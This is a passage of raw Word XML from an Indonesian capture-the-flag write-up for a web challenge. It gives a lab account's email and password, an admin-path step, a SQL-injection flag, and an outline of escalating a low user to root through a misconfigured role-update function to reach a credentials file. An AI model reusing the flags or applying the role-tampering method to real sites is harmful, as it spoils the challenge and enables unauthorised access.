              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FC4A32">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>suhada@zerobyte.id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2268" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7C2DB12B" w14:textId="22C8BEBA" w:rsidR="001A1509" w:rsidRDefault="00DB526F" w:rsidP="00455D5A">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00DB526F">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>0xshdaxLowUSER!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="692620B3" w14:textId="77777777" w:rsidR="00D06DC4" w:rsidRDefault="00D06DC4" w:rsidP="00455D5A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C695BE6" w14:textId="63AC6EDE" w:rsidR="00BD0C03" w:rsidRDefault="0065561A" w:rsidP="00455D5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Lanjut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">…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login admin web </w:t>
      </w:r>
      <w:r w:rsidR="00AB7BA9">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>CTF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77D61270" w14:textId="72F35832" w:rsidR="00BD0C03" w:rsidRDefault="00103BC1" w:rsidP="00455D5A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Supaya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0080B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ketik</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D0080B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00D0080B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dibelakang</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D06DC4">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D0080B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D0080B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00D0080B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D06DC4">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D0080B">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>web CTF    /admin/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8AE8A5" w14:textId="4B548859" w:rsidR="00AF1BDA" w:rsidRDefault="009C03E5" w:rsidP="00455D5A">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Dan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dengan </w:t>
      </w:r>
      <w:r w:rsidR="00271AAB">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">email </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:history="1">
        <w:r w:rsidR="008C3B13" w:rsidRPr="000D68EC">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>suhada@zerobyte.id</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="008C3B13">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008C3B13">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sebagai</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008C3B13">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> low</w:t>
      </w:r>
      <w:r w:rsidR="006A7F23">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008C3B13">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E09D341" w14:textId="1F3D4496" w:rsidR="009C03E5" w:rsidRDefault="009D0522" w:rsidP="009C03E5">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r w:rsidRPr="009D0522">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C7CF00F" wp14:editId="3ADA315D">
            <wp:extent cx="5264150" cy="2299581"/>
            <wp:effectExtent l="0" t="0" r="0" b="5715"/>
            <wp:docPr id="9278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96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116" cy="23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7B03" w14:textId="53C343AD" w:rsidR="00AA0E4F" w:rsidRPr="00D06DC4" w:rsidRDefault="00AA0E4F" w:rsidP="009C03E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06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Jika </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sudah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06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>klik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login </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tampilan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web </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>akan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06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>seperti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ini</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E0F53A" w14:textId="6005AD64" w:rsidR="00AF1BDA" w:rsidRDefault="0074021E" w:rsidP="00AF1BDA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:r w:rsidRPr="0074021E">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="54D9CE4D" wp14:editId="533FBB99">
            <wp:extent cx="5251450" cy="1919335"/>
            <wp:effectExtent l="0" t="0" r="6350" b="5080"/>
            <wp:docPr id="186010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01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81" cy="19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E56" w14:textId="7F3BA4E4" w:rsidR="00AA0E4F" w:rsidRPr="00D06DC4" w:rsidRDefault="00E81759" w:rsidP="00AF1BDA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> flag pada </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C95FFA" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>halaman</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C95FFA" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> admin</w:t>
      </w:r>
      <w:r w:rsidR="00B9700C" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> low user</w:t>
      </w:r>
      <w:r w:rsidR="00C95FFA" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00D0606D" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D0606D" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00D0606D">
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00D0606D">
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00F526BF" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00F526BF" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>SQL INJECTION)</w:t>
      </w:r>
      <w:r w:rsidR="005A49CB">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005A49CB" w:rsidRPr="00D06DC4">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>FLAG:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12540815" w14:textId="5A558FF6" w:rsidR="00C95FFA" w:rsidRPr="00D0606D" w:rsidRDefault="00335867" w:rsidP="00AF1BDA">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00335867">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>FLAG{0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00335867">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>xSQL!nJecT</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00335867">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>!0n_Blind)</w:t>
      </w:r>
      <w:r w:rsidR="00201AFF">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="D63384"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="093274F9" w14:textId="77777777" w:rsidR="00D06DC4" w:rsidRDefault="00D06DC4" w:rsidP="00AD5F3B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EA13B63" w14:textId="77777777" w:rsidR="00D06DC4" w:rsidRDefault="00D06DC4" w:rsidP="00AD5F3B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FD55778" w14:textId="77777777" w:rsidR="00D06DC4" w:rsidRDefault="00D06DC4" w:rsidP="00AD5F3B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55F8129D" w14:textId="77777777" w:rsidR="00D06DC4" w:rsidRDefault="00D06DC4" w:rsidP="00AD5F3B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="467506BC" w14:textId="36898D22" w:rsidR="00C51519" w:rsidRPr="000066AA" w:rsidRDefault="00AD5F3B" w:rsidP="00AD5F3B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Lanjut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">… </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="001212CF" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>setelah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="001212CF" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ini </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mengubah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r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A63E3B" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A63E3B"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r w:rsidR="00EF2E2E" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Low user</w:t>
      </w:r>
      <w:r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CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>menjadi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r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r w:rsidR="00EF2E2E" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>super</w:t>
      </w:r>
      <w:r w:rsidR="00B964A4"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r w:rsidR="00EF2E2E" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>user/root</w:t>
      </w:r>
      <w:r w:rsidR="00A63E3B" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> pada em</w:t>
      </w:r>
      <w:r w:rsidR="00C51519" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ail </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00C51519" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>suhada</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000066A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066AA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidR="00C51519" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ntuk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C51519" w:rsidRPr="00CB2EEE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51519" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mendapatkan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00C51519" w:rsidRPr="00CB2EEE">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> file credential</w:t>
      </w:r>
      <w:r w:rsidR="00292E5E">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.zip</w:t>
      </w:r>
      <w:r w:rsidR="000066AA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00870ECA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00870ECA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>diwebsite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00870ECA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> CTF ini </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00870ECA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00870EC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A554B5">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>celah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A554B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870ECA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>miskonfi</w:t>
      </w:r>
      <w:r w:rsidR="00723126">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gu</w:t>
      </w:r>
      <w:r w:rsidR="00870ECA">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rasi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44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gramStart"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">pada </w:t>
      </w:r>
      <w:r w:rsidR="00A554B5">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003F0B23">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>function</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="003F0B23">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> update role </w:t>
      </w:r>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">program yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dimana</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>seharusnya</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00515A44" w:rsidRPr="00515A44">
        <w:rPr>
          <w:rFonts w:cstheme="minorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
